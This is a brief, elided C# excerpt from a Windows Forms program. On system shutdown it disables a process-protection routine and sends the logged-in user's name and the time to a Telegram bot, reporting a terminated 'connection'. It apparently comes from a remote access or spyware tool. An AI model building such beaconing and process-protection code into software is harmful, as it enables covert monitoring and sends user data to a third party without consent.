        ...
        public partial class MainForm : Form
        {
            ...
            protected override void WndProc(ref Message m)
            {
                if (m.Msg == WM_QUERYENDSESSION || m.Msg == WM_ENDSESSION)
                {
                    ...
                    unprotectProcess();
                    telegram.sendText(
                                     "\n💤 User: " + Environment.UserName + " has either shutdown their pc or terminated the connection." +
                                     "\n System time of connection termination: " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") +
                                      "");
                    // Close process
